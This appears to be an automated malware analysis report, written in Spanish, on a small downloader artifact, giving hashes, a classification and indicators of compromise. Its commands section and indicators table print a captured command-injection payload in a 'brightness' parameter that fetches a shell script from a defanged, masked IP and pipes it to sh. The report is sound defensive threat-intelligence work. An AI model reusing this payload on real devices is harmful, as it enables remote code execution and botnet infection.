# 🧬 Payload Analysis

`28c7dd2a184df4ca704e900d3c4e39445a8c0eebaed524e4bd1ee6c754919ae1`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 195 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `28c7dd2a184df4ca704e900d3c4e39445a8c0eebaed524e4bd1ee6c754919ae1`
- **SHA1:** `05dd73994f27b9754f069fc873c7b795f8798d78`
- **MD5:** `09d8f20d1ed52cb8eb4a3ae6c771d4f4`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 195 B |
| Entropía | 4.87 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
action=white_led&brightness=$(cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s avtech2;busybox wget hxxp://91.92.40.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | action=white_led&brightness=$(cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s avtech2;busybox wget hxxp://91.92.40.XXX | strings |
| hash | 28c7dd2a184df4ca704e900d3c4e39445a8c0eebaed524e4bd1ee6c754919ae1 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
